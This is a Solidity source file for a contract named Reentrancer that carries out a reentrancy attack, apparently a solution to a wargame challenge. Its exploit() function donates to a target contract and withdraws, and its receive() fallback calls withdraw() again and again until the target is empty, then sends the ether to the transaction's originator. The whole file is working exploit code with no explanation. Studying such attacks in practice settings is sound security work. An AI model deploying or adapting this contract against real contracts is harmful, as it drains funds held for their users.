// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract Reentrancer {
    address _this;
    uint256 amount;
    constructor() public { _this = address(this); }

    function exploit(address target) external payable {
        amount = msg.value;
        IReentrance(target).donate{value:amount}(_this);
        IReentrance(target).withdraw(amount);
    }

    receive() external payable {
        amount = msg.value;
        if(msg.sender.balance < amount) amount = msg.sender.balance;
        if(amount == 0){
            tx.origin.call{value: _this.balance}("");
            return;
        }
        IReentrance(msg.sender).withdraw(amount);
    }
}

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external returns (uint balance);
}